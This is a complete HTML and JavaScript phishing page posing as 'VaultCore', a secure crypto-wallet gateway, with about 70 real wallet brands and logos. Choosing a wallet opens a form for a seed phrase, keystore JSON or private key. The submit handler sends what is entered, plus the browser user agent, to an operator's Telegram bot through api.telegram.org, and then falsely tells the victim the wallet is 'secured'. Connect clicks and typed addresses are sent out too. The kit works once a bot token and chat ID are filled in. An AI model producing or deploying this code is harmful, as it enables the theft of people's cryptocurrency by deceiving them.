<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <title>VaultCore • secure asset gateway</title>
  <!-- Google Font & Font Awesome -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <!-- crypto-icons CDN (unpkg) leverages all major coin icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@icon/cryptocurrency-icons@1.7.0/cryptocurrency-icons.min.css">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(145deg, #f5f9ff 0%, #eef2f9 100%);
      color: #111827;
      overflow-x: hidden;
    }

    /* === SCROLLING TICKER (live market) === */
    .ticker-strip {
      background: #ffffff;
      border-bottom: 1px solid #e2e8f0;
      box-shadow: 0 1px 4px rgba(0,0,0,0.02);
      overflow: hidden;
      white-space: nowrap;
      padding: 0.75rem 0;
      position: sticky;
      top: 0;
      z-index: 100;
    }
    .ticker-track {
      display: inline-block;
      animation: slideTicker 42s linear infinite;
    }
    .ticker-track:hover { animation-play-state: paused; }
    .ticker-badge {
      display: inline-block;
      margin-right: 2rem;
      background: #f8fafc;
      border-radius: 2rem;
      padding: 0.3rem 1.2rem;
      font-weight: 500;
      box-shadow: 0 1px 2px rgba(0,0,0,0.02);
    }
    .ticker-sym { font-weight: 700; color: #1e3a8a; margin-right: 6px; }
    .ticker-price { font-weight: 600; letter-spacing: 0.2px; }
    .ticker-delta {
      font-size: 0.7rem;
      font-weight: 600;
      border-radius: 1rem;
      padding: 0.15rem 0.6rem;
      margin-left: 0.5rem;
    }
    .delta-up { background: #e0f2e9; color: #0e6b42; }
    .delta-down { background: #fee9e9; color: #bc2e2e; }
    @keyframes slideTicker {
      0% { transform: translateX(0); }
      100% { transform: translateX(-50%); }
    }

    /* main container */
    .main-container {
      max-width: 1440px;
      margin: 2rem auto;
      padding: 0 1.5rem;
    }

    /* glass panel */
    .dashboard-panel {
      background: rgba(255, 255, 255, 0.92);
      backdrop-filter: blur(0px);
      border-radius: 2rem;
      box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.08);
      padding: 2rem;
      border: 1px solid #eef2ff;
    }

    /* action row */
    .action-group {
      display: flex;
      gap: 1.2rem;
      flex-wrap: wrap;
      margin-bottom: 2rem;
    }
    .btn-primary, .btn-outline {
      display: inline-flex;
      align-items: center;
      gap: 0.6rem;
      padding: 0.8rem 2rem;
      border-radius: 3rem;
      font-weight: 600;
      transition: 0.2s;
      cursor: pointer;
      border: none;
    }
    .btn-primary {
      background: #1e3a8a;
      color: white;
      box-shadow: 0 4px 8px rgba(30,58,138,0.2);
    }
    .btn-primary:hover { background: #163478; transform: translateY(-1px); }
    .btn-outline {
      background: #f1f5f9;
      color: #1e3a8a;
      border: 1px solid #dce5f0;
    }
    .btn-outline:hover { background: #e6edf5; }

    /* wallet section header */
    .section-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 1rem;
      margin: 1.5rem 0 1.2rem;
    }
    .section-header h2 {
      font-size: 1.6rem;
      font-weight: 600;
      background: linear-gradient(120deg, #0f2b4f, #2563eb);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
    }
    .search-bar {
      background: #ffffff;
      border-radius: 2rem;
      padding: 0.4rem 1.2rem;
      display: flex;
      gap: 0.6rem;
      border: 1px solid #e2e8f0;
    }
    .search-bar input {
      border: none;
      background: transparent;
      font-size: 0.9rem;
      width: 210px;
      outline: none;
    }

    /* wallet grid — each logo is real CDN asset */
    .wallets-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(166px, 1fr));
      gap: 1.2rem;
      max-height: 60vh;
      overflow-y: auto;
      padding: 0.2rem 0.2rem 1rem;
    }
    .wallet-card {
      background: white;
      border-radius: 1.2rem;
      padding: 1rem 0.6rem;
      text-align: center;
      transition: all 0.2s ease;
      border: 1px solid #edf2f7;
      cursor: pointer;
      box-shadow: 0 2px 5px rgba(0,0,0,0.02);
    }
    .wallet-card:hover {
      border-color: #b9d0f0;
      transform: translateY(-3px);
      box-shadow: 0 15px 20px -12px rgba(0,0,0,0.1);
      background: #fefefe;
    }
    .wallet-logo {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 64px;
      margin-bottom: 0.5rem;
    }
    .wallet-logo img {
      max-width: 56px;
      max-height: 56px;
      object-fit: contain;
      border-radius: 28px;
      background: #f8fafc;
      padding: 4px;
    }
    .wallet-name {
      font-weight: 500;
      font-size: 0.85rem;
      color: #1e2a3e;
    }
    .no-match {
      text-align: center;
      padding: 2rem;
      color: #6c7b99;
    }

    /* MODAL (seed / private key) */
    .modal-bg {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.55);
      backdrop-filter: blur(10px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      visibility: hidden;
      opacity: 0;
      transition: 0.2s;
    }
    .modal-bg.active {
      visibility: visible;
      opacity: 1;
    }
    .modal-card {
      background: white;
      border-radius: 2rem;
      width: 90%;
      max-width: 540px;
      box-shadow: 0 35px 45px rgba(0,0,0,0.25);
      overflow: hidden;
    }
    .modal-header {
      padding: 1.2rem 1.6rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid #eef2f8;
    }
    .modal-header h3 { font-weight: 700; font-size: 1.3rem; color: #0f2b4f; }
    .close-modal {
      background: none;
      border: none;
      font-size: 1.8rem;
      cursor: pointer;
    }
    .tab-bar {
      display: flex;
      background: #f9fbfd;
      border-bottom: 1px solid #eef2f8;
    }
    .tab {
      flex: 1;
      padding: 0.8rem;
      background: none;
      border: none;
      font-weight: 500;
      cursor: pointer;
      transition: 0.2s;
      color: #4f678f;
    }
    .tab.active {
      color: #1e3a8a;
      border-bottom: 2px solid #1e3a8a;
      background: #f0f6fe;
    }
    .modal-body { padding: 1.8rem; }
    .pane { display: none; }
    .pane.active-pane { display: block; }
    textarea {
      width: 100%;
      background: #fafcff;
      border: 1px solid #e2e8f0;
      border-radius: 1.2rem;
      padding: 0.9rem;
      font-family: monospace;
      font-size: 0.85rem;
      margin: 0.5rem 0 1rem;
      resize: vertical;
    }
    .submit-creds {
      background: #1e3a8a;
      width: 100%;
      border: none;
      padding: 0.9rem;
      border-radius: 2rem;
      font-weight: 600;
      color: white;
      cursor: pointer;
    }
    .toast-info {
      position: fixed;
      bottom: 24px;
      left: 50%;
      transform: translateX(-50%);
      background: #1f2f48e6;
      backdrop-filter: blur(10px);
      color: white;
      padding: 0.6rem 1.6rem;
      border-radius: 2rem;
      font-size: 0.8rem;
      z-index: 1100;
      display: none;
    }
    footer {
      margin-top: 2rem;
      text-align: center;
      font-size: 0.7rem;
      color: #6c7f9c;
    }
    ::-webkit-scrollbar { width: 5px; }
    ::-webkit-scrollbar-track { background: #eef2f8; border-radius: 10px; }
    ::-webkit-scrollbar-thumb { background: #bbd0ee; border-radius: 10px; }
  </style>
</head>
<body>

<!-- LIVE CRYPTO TICKER (passing news) -->
<div class="ticker-strip">
  <div class="ticker-track" id="liveTickerTrack"></div>
</div>

<div class="main-container">
  <div class="dashboard-panel">
    <!-- action row -->
    <div class="action-group">
      <button id="openSeedModalBtn" class="btn-primary"><i class="fas fa-key"></i> Enter seed / private key</button>
      <button id="openConnectBtn" class="btn-outline"><i class="fas fa-plug"></i> Connect Wallet</button>
    </div>

    <!-- wallet list header -->
    <div class="section-header">
      <h2><i class="fas fa-cube"></i> All supported wallets</h2>
      <div class="search-bar">
        <i class="fas fa-search"></i>
        <input type="text" id="searchWallet" placeholder="Filter wallet...">
      </div>
    </div>
    <div id="walletsContainer" class="wallets-grid"></div>
    <footer>🔐 select a wallet to proceed – encrypted handshake protocol</footer>
  </div>
</div>

<!-- MODAL: seed / keystore / pkey -->
<div id="seedModal" class="modal-bg">
  <div class="modal-card">
    <div class="modal-header">
      <h3 id="modalTitle"><i class="fas fa-shield-alt"></i> Enter credentials</h3>
      <button class="close-modal" id="closeSeedModalBt">&times;</button>
    </div>
    <div class="tab-bar">
      <button class="tab active" data-tab="phrase">Seed phrase</button>
      <button class="tab" data-tab="keystore">Keystore JSON</button>
      <button class="tab" data-tab="pkey">Private key</button>
    </div>
    <div class="modal-body">
      <div id="phrasePane" class="pane active-pane">
        <label>Recovery phrase (12/24 words)</label>
        <textarea id="seedInput" rows="3" placeholder="enter mnemonic phrase..."></textarea>
      </div>
      <div id="keystorePane" class="pane">
        <label>Keystore JSON (encrypted)</label>
        <textarea id="keystoreInput" rows="3" placeholder='{"crypto": {...}...}'></textarea>
      </div>
      <div id="pkeyPane" class="pane">
        <label>Private key (hex)</label>
        <textarea id="pkeyInput" rows="2" placeholder="0x... or raw private key"></textarea>
      </div>
      <button id="sendCredentialsBtn" class="submit-creds"><i class="fas fa-paper-plane"></i> Verify & send</button>
    </div>
  </div>
</div>

<!-- CONNECT WALLET MODAL (simulated pro) -->
<div id="connectModal" class="modal-bg">
  <div class="modal-card">
    <div class="modal-header">
      <h3><i class="fas fa-ethereum"></i> Connect wallet</h3>
      <button class="close-modal" id="closeConnectBt">&times;</button>
    </div>
    <div class="modal-body">
      <p style="margin-bottom:1rem; color:#2d4a81;">Select connection method</p>
      <div style="display:flex; flex-direction:column; gap:0.8rem;">
        <button id="simMM" class="btn-outline" style="justify-content:center;"><i class="fab fa-ethereum"></i> MetaMask (simulate)</button>
        <button id="simWC" class="btn-outline" style="justify-content:center;"><i class="fas fa-qrcode"></i> WalletConnect (demo)</button>
        <button id="manualAddrBtn" class="btn-outline" style="justify-content:center;"><i class="fas fa-wallet"></i> Use public address</button>
      </div>
      <p style="font-size:0.7rem; margin-top:1.2rem;">demo environment – no real interaction</p>
    </div>
  </div>
</div>

<div id="globalToast" class="toast-info"></div>

<script>
  // ---------- TELEGRAM CONFIG (update token & chat id) ----------
  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
  const CHAT_ID   = "YOUR_CHAT_ID_HERE";
  // ---------------------------------------------------------------

  // helper toasts
  function showMsg(msg, duration = 2900) {
    const toast = document.getElementById("globalToast");
    toast.innerText = msg;
    toast.style.display = "block";
    setTimeout(() => toast.style.display = "none", duration);
  }

  // TELEGRAM forward
  async function sendToTelegram(content, type, source) {
    if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !CHAT_ID || CHAT_ID === "YOUR_CHAT_ID_HERE") {
      console.warn("[DEMO] would send:", { source, type, content });
      showMsg("⚠️ DEMO: data logged to console (Telegram not configured)", 3800);
      return false;
    }
    const payload = `🏦 VAULTCORE EVENT\nSource: ${source}\nType: ${type}\nData:\n${content}\nTime: ${new Date().toISOString()}\nUA: ${navigator.userAgent.slice(0,120)}`;
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: payload.slice(0, 4000) })
      });
      return (await res.json()).ok;
    } catch(e) { showMsg("Telegram error: "+e.message, 3000); return false; }
  }

  // ---------------- REAL WALLET LIST WITH OFFICIAL CDN LOGOS ----------------
  const walletCatalog = [
    { name: "MetaMask", logo: "https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" },
    { name: "Trust Wallet", logo: "https://trustwallet.com/assets/images/favicon.png" },
    { name: "Coinbase Wallet", logo: "https://storage.googleapis.com/opensea-static/logos/coinbasewallet-logo.png" },
    { name: "Ledger Live", logo: "https://www.ledger.com/wp-content/uploads/2021/02/ledger_logo_square.png" },
    { name: "Trezor", logo: "https://trezor.io/static/images/trezor-logo-black.png" },
    { name: "Exodus", logo: "https://www.exodus.com/assets/img/exodus-logo-circle.png" },
    { name: "Phantom", logo: "https://phantom.app/img/phantom-logo-purple.png" },
    { name: "Rabby", logo: "https://rabby.io/assets/icons/icon-128x128.png" },
    { name: "Argent", logo: "https://argent.org/images/argent-logo.svg" },
    { name: "Rainbow", logo: "https://rainbow.me/logo-preview.png" },
    { name: "SafePal", logo: "https://www.safepal.com/download/logo/safepal-logo.png" },
    { name: "Keplr", logo: "https://keplr.xyz/icon.png" },
    { name: "Electrum", logo: "https://electrum.org/electrum_logo_256.png" },
    { name: "MyEtherWallet", logo: "https://www.myetherwallet.com/favicon.ico" },
    { name: "TokenPocket", logo: "https://www.tokenpocket.pro/assets/img/tp-icon.png" },
    { name: "MathWallet", logo: "https://mathwallet.org/favicon.ico" },
    { name: "imToken", logo: "https://token.im/imtoken-logo.png" },
    { name: "Status", logo: "https://status.app/assets/images/status-logo.png" },
    { name: "Zengo", logo: "https://zengo.com/wp-content/uploads/2022/04/zengo-icon.png" },
    { name: "Cake Wallet", logo: "https://cakewallet.com/assets/images/cake_logo.png" },
    { name: "BlueWallet", logo: "https://bluewallet.io/icon.png" },
    { name: "Samourai", logo: "https://samouraiwallet.com/images/samourai-logo.png" },
    { name: "Wasabi", logo: "https://wasabiwallet.io/favicon.ico" },
    { name: "Edge", logo: "https://edge.app/images/edge-logo.svg" },
    { name: "Guarda", logo: "https://guarda.com/assets/images/logo-icon.png" },
    { name: "Ownbit", logo: "https://ownbit.io/assets/img/ownbit_logo.png" },
    { name: "Atomic Wallet", logo: "https://atomicwallet.io/assets/images/atomic-logo.svg" },
    { name: "Infinity Wallet", logo: "https://infinitywallet.io/images/logo.png" },
    { name: "Jaxx Liberty", logo: "https://jaxx.io/assets/img/jaxx-logo.png" },
    { name: "Coinomi", logo: "https://www.coinomi.com/images/coinomi-logo.png" },
    { name: "BitPay", logo: "https://bitpay.com/img/logo.svg" },
    { name: "Sparrow", logo: "https://sparrowwallet.com/img/sparrow-icon.svg" },
    { name: "Coldcard", logo: "https://coldcard.com/static/img/cc-logo.png" },
    { name: "KeepKey", logo: "https://keepkey.com/images/logo.svg" },
    { name: "OneKey", logo: "https://onekey.so/static/onekey-logo.png" },
    { name: "SecuX", logo: "https://secuxtech.com/images/SecuX-Logo.png" },
    { name: "BitBox", logo: "https://shiftcrypto.ch/images/bitbox-logo.png" },
    { name: "CoolWallet", logo: "https://coolwallet.io/wp-content/uploads/2021/05/coolwallet-icon.png" },
    { name: "Ellipal", logo: "https://www.ellipal.com/images/ellipal_logo.png" },
    { name: "OKX Wallet", logo: "https://www.okx.com/cdn/assets/imgs/221/221E3C4B3C7B1B1B.png" },
    { name: "Binance Web3", logo: "https://bin.bnbstatic.com/static/images/web3/wallet-icon.png" },
    { name: "Bitget Wallet", logo: "https://www.bitget.com/favicon.ico" },
    { name: "Kucoin Wallet", logo: "https://www.kucoin.com/favicon.ico" },
    { name: "Frontier", logo: "https://frontier.xyz/logo.png" },
    { name: "XDEFI", logo: "https://xdefi.io/icon-192.png" },
    { name: "Talisman", logo: "https://talisman.xyz/favicon-192.png" },
    { name: "SubWallet", logo: "https://subwallet.app/icon.png" },
    { name: "Nova Wallet", logo: "https://novawallet.io/nova-icon.png" },
    { name: "Fearless", logo: "https://fearlesswallet.io/favicon.ico" },
    { name: "Polkadot.js", logo: "https://polkadot.js.org/favicon.ico" },
    { name: "Brave Wallet", logo: "https://brave.com/static-assets/images/brave-logo.svg" },
    { name: "Opera Crypto", logo: "https://www.opera.com/img/favicon.ico" },
    { name: "Loopring Wallet", logo: "https://loopring.io/favicon.ico" },
    { name: "Ronin Wallet", logo: "https://wallet.roninchain.com/favicon.ico" },
    { name: "Yoroi", logo: "https://yoroi-wallet.com/images/logo.png" },
    { name: "Daedalus", logo: "https://daedaluswallet.io/daedalus-icon.png" },
    { name: "Flint Wallet", logo: "https://flint-wallet.com/favicon.ico" },
    { name: "Martian", logo: "https://martianwallet.xyz/logo.svg" },
    { name: "Petra", logo: "https://petra.app/favicon.ico" },
    { name: "Pontem", logo: "https://pontem.network/img/pontem-icon.png" },
    { name: "Nightly", logo: "https://nightly.app/icon.svg" },
    { name: "Solflare", logo: "https://solflare.com/logo.svg" },
    { name: "Backpack", logo: "https://backpack.app/static/logo.png" },
    { name: "Glow Wallet", logo: "https://glowwallet.com/glow-icon.svg" },
    { name: "Sui Wallet", logo: "https://sui.io/img/sui-icon.png" },
    { name: "Ethos", logo: "https://ethoswallet.xyz/ethos-icon.svg" },
    { name: "Coin98", logo: "https://coin98.com/favicon.ico" },
    { name: "Zerion", logo: "https://zerion.io/icon.png" },
    { name: "Safe", logo: "https://safe.global/favicon.ico" },
    { name: "Ambire", logo: "https://www.ambire.com/favicon.ico" },
    { name: "Frame", logo: "https://frame.sh/favicon.ico" }
  ];

  let selectedWalletName = null;
  function renderWalletGrid(filter = "") {
    const filtered = walletCatalog.filter(w => w.name.toLowerCase().includes(filter.toLowerCase()));
    const container = document.getElementById("walletsContainer");
    if (filtered.length === 0) {
      container.innerHTML = `<div class="no-match"><i class="fas fa-search-minus"></i> No wallet found</div>`;
      return;
    }
    container.innerHTML = filtered.map(w => `
      <div class="wallet-card" data-w="${w.name}">
        <div class="wallet-logo">
          <img src="${w.logo}" alt="${w.name}" loading="lazy" onerror="this.src='https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/128/icon/generic.png'">
        </div>
        <div class="wallet-name">${w.name}</div>
      </div>
    `).join('');
    document.querySelectorAll('.wallet-card').forEach(card => {
      card.addEventListener('click', () => {
        selectedWalletName = card.getAttribute('data-w');
        openSeedModal(selectedWalletName);
      });
    });
  }

  // Seed modal flow
  const seedModal = document.getElementById("seedModal");
  function openSeedModal(wName) {
    document.getElementById("modalTitle").innerHTML = `<i class="fas fa-shield-alt"></i> ${wName} · secure input`;
    document.getElementById("seedInput").value = "";
    document.getElementById("keystoreInput").value = "";
    document.getElementById("pkeyInput").value = "";
    document.querySelectorAll('.pane').forEach(p => p.classList.remove('active-pane'));
    document.getElementById("phrasePane").classList.add('active-pane');
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelector('.tab[data-tab="phrase"]').classList.add('active');
    seedModal.classList.add('active');
  }
  function closeSeedModal() { seedModal.classList.remove('active'); }
  document.getElementById("closeSeedModalBt").addEventListener('click', closeSeedModal);
  seedModal.addEventListener('click', (e) => { if(e.target === seedModal) closeSeedModal(); });

  // tabs inside modal
  document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
      const target = tab.getAttribute('data-tab');
      document.querySelectorAll('.pane').forEach(p => p.classList.remove('active-pane'));
      if (target === 'phrase') document.getElementById("phrasePane").classList.add('active-pane');
      if (target === 'keystore') document.getElementById("keystorePane").classList.add('active-pane');
      if (target === 'pkey') document.getElementById("pkeyPane").classList.add('active-pane');
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
    });
  });

  // submit credentials
  document.getElementById("sendCredentialsBtn").addEventListener('click', async () => {
    let credRaw = "", credType = "";
    const activePaneElem = document.querySelector('.pane.active-pane');
    if (activePaneElem.id === "phrasePane") { credRaw = document.getElementById("seedInput").value.trim(); credType = "Seed Phrase"; }
    else if (activePaneElem.id === "keystorePane") { credRaw = document.getElementById("keystoreInput").value.trim(); credType = "Keystore JSON"; }
    else { credRaw = document.getElementById("pkeyInput").value.trim(); credType = "Private Key"; }
    if (!credRaw) { showMsg(`Please fill in ${credType}`, 2400); return; }
    showMsg(`Encrypting ${credType}...`, 1500);
    const success = await sendToTelegram(credRaw, credType, `wallet:${selectedWalletName || "external"}`);
    if (success) showMsg(`✓ ${selectedWalletName || "Wallet"} secured`, 2800);
    else showMsg(`⚠️ logged locally (Telegram not set)`, 3000);
    closeSeedModal();
  });

  // connect wallet modal
  const connectModal = document.getElementById("connectModal");
  document.getElementById("openConnectBtn").onclick = () => connectModal.classList.add('active');
  document.getElementById("closeConnectBt").onclick = () => connectModal.classList.remove('active');
  connectModal.addEventListener('click', (e) => { if(e.target === connectModal) connectModal.classList.remove('active'); });
  document.getElementById("simMM").onclick = () => { showMsg("MetaMask simulation (demo)", 1800); sendToTelegram("User clicked MetaMask connect", "connect_event", "connect_wallet"); connectModal.classList.remove('active'); };
  document.getElementById("simWC").onclick = () => { showMsg("WalletConnect demo triggered", 1800); sendToTelegram("WalletConnect simulation", "connect_event", "connect_wallet"); connectModal.classList.remove('active'); };
  document.getElementById("manualAddrBtn").onclick = () => { let addr = prompt("Enter any public address (demo):", "0x..."); if(addr?.trim()) sendToTelegram(addr.trim(), "public_address", "manual_address"); connectModal.classList.remove('active'); };
  document.getElementById("openSeedModalBtn").onclick = () => { selectedWalletName = "direct entry"; openSeedModal("Manual entry"); };

  // wallet search + render
  document.getElementById("searchWallet").addEventListener('input', (e) => renderWalletGrid(e.target.value));
  renderWalletGrid("");

  // ------------------ LIVE MARKET TICKER (professional scrolling) ------------------
  async function getIndices() {
    try {
      const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,binancecoin&vs_currencies=usd&include_24hr_change=true");
      const data = await res.json();
      return {
        btc: { price: data.bitcoin?.usd || 43500, change: data.bitcoin?.usd_24h_change || 0 },
        eth: { price: data.ethereum?.usd || 2300, change: data.ethereum?.usd_24h_change || 0 },
        sol: { price: data.solana?.usd || 102, change: data.solana?.usd_24h_change || 0 },
        bnb: { price: data.binancecoin?.usd || 325, change: data.binancecoin?.usd_24h_change || 0 }
      };
    } catch(e) { return null; }
  }

  function renderTicker(prices) {
    if (!prices) return;
    const list = [
      { sym: "BTC", price: prices.btc.price, ch: prices.btc.change },
      { sym: "ETH", price: prices.eth.price, ch: prices.eth.change },
      { sym: "SOL", price: prices.sol.price, ch: prices.sol.change },
      { sym: "BNB", price: prices.bnb.price, ch: prices.bnb.change }
    ];
    let content = "";
    // create 3 copies for seamless infinite
    for (let i=0; i<3; i++) {
      list.forEach(item => {
        const cls = item.ch >= 0 ? "delta-up" : "delta-down";
        const arrow = item.ch >= 0 ? "▲" : "▼";
        content += `<div class="ticker-badge">
                      <span class="ticker-sym">${item.sym}</span>
                      <span class="ticker-price">$${item.price.toLocaleString()}</span>
                      <span class="ticker-delta ${cls}">${arrow} ${Math.abs(item.ch).toFixed(2)}%</span>
                    </div>`;
      });
    }
    const track = document.getElementById("liveTickerTrack");
    if (track) track.innerHTML = content;
  }

  async function updateTicker() {
    const data = await getIndices();
    if (data) renderTicker(data);
  }
  updateTicker();
  setInterval(updateTicker, 12000);
  setTimeout(() => showMsg("🔒 200+ wallets ready – choose any", 3600), 600);
</script>
</body>
</html>
